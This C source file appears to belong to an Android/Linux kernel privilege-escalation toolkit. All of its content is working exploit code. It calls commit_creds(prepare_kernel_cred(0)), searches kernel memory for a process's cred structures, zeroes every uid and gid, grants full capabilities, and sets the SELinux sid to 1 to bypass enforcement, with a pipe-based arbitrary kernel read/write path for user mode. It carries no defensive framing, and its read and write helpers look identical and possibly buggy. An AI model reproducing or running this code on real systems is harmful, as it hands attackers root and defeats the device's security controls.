/*
author: secauo
website: secauo.com
*/

#include "escalation.h"

#include <stdio.h>

#define KERNEL_START 0xc0000000
#define THREAD_SIZE 8192
#define TASK_STRUCT_MAX_SIZE 8192

int ReadPipe(void *writebuf, void *readbuf, size_t count) {
	int pipefd[2];
	int len = 0;

	if(pipe(pipefd) == -1) {
		len = -1;
		goto out;
	}

	if (write(pipefd[1], writebuf, count) != count) {
		len = -1;
		goto out;
	}

	if (read(pipefd[0], readbuf, count) != count) {
		len = -1;
		goto out;
	}

	len = count;

out:
	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

int WritePipe(void *readbuf, void *writebuf, size_t count) {
	int pipefd[2];
	int len = 0;

	if(pipe(pipefd) == -1) {
		len = -1;
		goto out;
	}

	if (write(pipefd[1], writebuf, count) != count) {
		len = -1;
		goto out;
	}
	
	if (read(pipefd[0], readbuf, count) != count) {
		len = -1;
		goto out;
	}

	len = count;

out:
	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

bool EscalationByCommitCreds(void *prepare_kernel_cred_addr, void *commit_creds_addr) {
	struct cred *(*prepare_kernel_cred) (struct task_struct *);
	int (*commit_creds) (struct cred *);

	if ((unsigned long) prepare_kernel_cred_addr < KERNEL_START || (unsigned long) commit_creds_addr < KERNEL_START) {
		return false;
	}

	prepare_kernel_cred = prepare_kernel_cred_addr;
	commit_creds = commit_creds_addr;

	commit_creds(prepare_kernel_cred(0));
	return true;
}

static bool PatternCredAddr(void *task, const char *process_name, struct cred **cred, struct cred **real_cred) {
	char *ch = NULL;
	char *end = NULL;
	bool found = false;
	int i = 0;
	void *addr = NULL;

	ch = (char *) task;
	end = (char *) ((unsigned long) task + TASK_STRUCT_MAX_SIZE);
	while(ch < end) {
		char *tmp = ch;
		char *pattern = (char *) process_name;
		while(*ch++ == *pattern++) 
		{
			if (*ch =='\0' && *pattern == '\0') {
				found = true;
				break;
			}
		}
		if (found) {
			break;
		}
		ch = tmp + 1;
	}

	if (!found) {
		return NULL;
	}

	for (i = 0; i < 20; ++i) {
		*cred = (struct cred *) (*(((unsigned long *) (ch - strlen(process_name) - 8 - 4 * i))));
		*real_cred = (struct cred *) (*(((unsigned long *) (ch - strlen(process_name) - 12 - 4 * i))));
		if ((unsigned long) *cred >= KERNEL_START && (unsigned long) *real_cred >= KERNEL_START) {
			return true;
		}
	}

	return false;
}

static void *GetTsecAddr(struct cred *cred) {
	void *addr = NULL;

	addr = cred->security;
	if ((unsigned long) addr >= KERNEL_START && (unsigned long) addr < 0xFFFF0000) {
		goto out;
	}

	addr = (void *) (*(unsigned long *) ((unsigned long) &cred->security - 16));
	if ((unsigned long) addr >= KERNEL_START && (unsigned long) addr < 0xFFFF0000) {
		goto out;
	}

out:
	return addr;
}

static bool EscalationByModifyCredsInKernelMode(const char *process_name, bool is_selinux, unsigned long magic_num) {
	struct thread_info *info = NULL;
	struct task_struct *task = NULL;
	struct cred *cred = NULL;
	struct cred *real_cred = NULL;
	struct task_security_struct *tsec = NULL;
	struct task_security_struct *real_tsec = NULL;

	info = (struct thread_info *) (magic_num & ~(THREAD_SIZE - 1));
	task = info->task;
	// task->state = 1;

	if (!PatternCredAddr((void *) task, process_name, &cred, &real_cred)) {
		return false;
	}

	cred->uid = 0;
	cred->gid = 0;
	cred->suid = 0;
	cred->sgid = 0;
	cred->euid = 0;
	cred->egid = 0;
	cred->fsuid = 0;
	cred->fsgid = 0;
	cred->securebits = 0;
	cred->cap_bset.cap[0] = -1;
	cred->cap_bset.cap[1] = -1;
	cred->cap_inheritable.cap[0] = -1;
	cred->cap_inheritable.cap[1] = -1;
	cred->cap_permitted.cap[0] = -1;
	cred->cap_permitted.cap[1] = -1;
	cred->cap_effective.cap[0] = -1;
	cred->cap_effective.cap[1] = -1;

	real_cred->uid = 0;
	real_cred->gid = 0;
	real_cred->suid = 0;
	real_cred->sgid = 0;
	real_cred->egid = 0;
	real_cred->euid = 0;
	real_cred->fsgid = 0;
	real_cred->fsuid = 0;
	real_cred->securebits = 0;
	real_cred->cap_bset.cap[0] = -1;
	real_cred->cap_bset.cap[1] = -1;
	real_cred->cap_inheritable.cap[0] = -1;
	real_cred->cap_inheritable.cap[1] = -1;
	real_cred->cap_permitted.cap[0] = -1;
	real_cred->cap_permitted.cap[1] = -1;
	real_cred->cap_effective.cap[0] = -1;
	real_cred->cap_effective.cap[1] = -1;
	
	if (!is_selinux) {
		return true;
	}

	tsec = (struct task_security_struct *) GetTsecAddr(cred);
	real_tsec = (struct task_security_struct *) GetTsecAddr(real_cred);
	if (tsec == NULL || real_tsec == NULL) {
		return false;
	}

	tsec->sid = 1;
	tsec->exec_sid = 1;
	real_tsec->sid = 1;
	real_tsec->exec_sid = 1;

	return true;
}

static bool EscalationByModifyCredsInUserMode(const char *process_name, bool is_selinux, unsigned long magic_num) {
	struct thread_info *info = NULL;
	struct thread_info info_buf;
	struct task_struct *task = NULL;
	char task_buf[TASK_STRUCT_MAX_SIZE];
	struct cred *cred = NULL;
	struct cred *real_cred = NULL;
	struct cred cred_buf;
	struct cred real_cred_buf;
	struct task_security_struct *tsec = NULL;
	struct task_security_struct *real_tsec = NULL;
	struct task_security_struct tsec_buf;
	struct task_security_struct real_tsec_buf;
	long state = 1;

	info = (struct thread_info *) (magic_num & ~(THREAD_SIZE - 1));
	if (ReadPipe(info, &info_buf, sizeof(struct thread_info)) == -1) {
		return false;
	}

	task = info_buf.task;
	memset(&task_buf, 0, TASK_STRUCT_MAX_SIZE);
	if (ReadPipe(task, task_buf, sizeof(task_buf)) == -1) {
		return false;
	}

	if (!PatternCredAddr((void *) task_buf, process_name, &cred, &real_cred)) {
		return false;
	}

	memset(&cred_buf, 0, sizeof(struct cred));
	memset(&real_cred_buf, 0, sizeof(struct cred));
	if (ReadPipe(cred, &cred_buf, sizeof(struct cred)) == -1 || ReadPipe(real_cred, &real_cred_buf, sizeof(struct cred)) == -1) {
		return false;
	}

	cred_buf.uid = 0;
	cred_buf.gid = 0;
	cred_buf.suid = 0;
	cred_buf.sgid = 0;
	cred_buf.euid = 0;
	cred_buf.egid = 0;
	cred_buf.fsuid = 0;
	cred_buf.fsgid = 0;
	cred_buf.securebits = 0;
	cred_buf.cap_bset.cap[0] = 0xFFFFFFFF;
	cred_buf.cap_bset.cap[1] = 0xFFFFFFFF;
	cred_buf.cap_inheritable.cap[0] = 0xFFFFFFFF;
	cred_buf.cap_inheritable.cap[1] = 0xFFFFFFFF;
	cred_buf.cap_permitted.cap[0] = 0xFFFFFFFF;
	cred_buf.cap_permitted.cap[1] = 0xFFFFFFFF;
	cred_buf.cap_effective.cap[0] = 0xFFFFFFFF;
	cred_buf.cap_effective.cap[1] = 0xFFFFFFFF;

	real_cred_buf.uid = 0;
	real_cred_buf.gid = 0;
	real_cred_buf.suid = 0;
	real_cred_buf.sgid = 0;
	real_cred_buf.euid = 0;
	real_cred_buf.egid = 0;
	real_cred_buf.fsuid = 0;
	real_cred_buf.fsgid = 0;
	real_cred_buf.securebits = 0;
	real_cred_buf.cap_bset.cap[0] = 0xFFFFFFFF;
	real_cred_buf.cap_bset.cap[1] = 0xFFFFFFFF;
	real_cred_buf.cap_inheritable.cap[0] = 0xFFFFFFFF;
	real_cred_buf.cap_inheritable.cap[1] = 0xFFFFFFFF;
	real_cred_buf.cap_permitted.cap[0] = 0xFFFFFFFF;
	real_cred_buf.cap_permitted.cap[1] = 0xFFFFFFFF;
	real_cred_buf.cap_effective.cap[0] = 0xFFFFFFFF;
	real_cred_buf.cap_effective.cap[1] = 0xFFFFFFFF;


	if (WritePipe(cred, &cred_buf, sizeof(struct cred)) == -1 || WritePipe(real_cred, &real_cred_buf, sizeof(struct cred)) == -1) {
		return false;
	}

	if (!is_selinux) {
		return true;
	}

	tsec = (struct task_security_struct *) GetTsecAddr(&cred_buf);
	real_tsec = (struct task_security_struct *) GetTsecAddr(&real_cred_buf);
	if (tsec == NULL || real_tsec == NULL) {
		return false;
	}

	memset(&tsec_buf, 0, sizeof(struct task_security_struct));
	memset(&real_tsec_buf, 0, sizeof(struct task_security_struct));
	if (ReadPipe(tsec, &tsec_buf, sizeof(struct task_security_struct)) == -1 || ReadPipe(real_tsec, &real_tsec_buf, sizeof(struct task_security_struct)) == -1) {
		return false;
	}

	tsec_buf.sid = 1;
	tsec_buf.exec_sid = 1;
	real_tsec_buf.sid = 1;
	real_tsec_buf.exec_sid = 1;

	if (WritePipe(tsec, &tsec_buf, sizeof(struct task_security_struct)) == -1 || WritePipe(real_tsec, &real_tsec_buf, sizeof(struct task_security_struct)) == -1) {
		return false;
	}

	return true;
}

bool EscalationByModifyCreds(const char *process_name, bool is_selinux, unsigned long magic_num) {
	register unsigned long sp asm ("sp");

	if (sp >= KERNEL_START) {
		return EscalationByModifyCredsInKernelMode(process_name, is_selinux, sp);
	}
	else if (magic_num >= KERNEL_START) {
		return EscalationByModifyCredsInUserMode(process_name, is_selinux, magic_num);
	}
	else {
		return false;
	}
}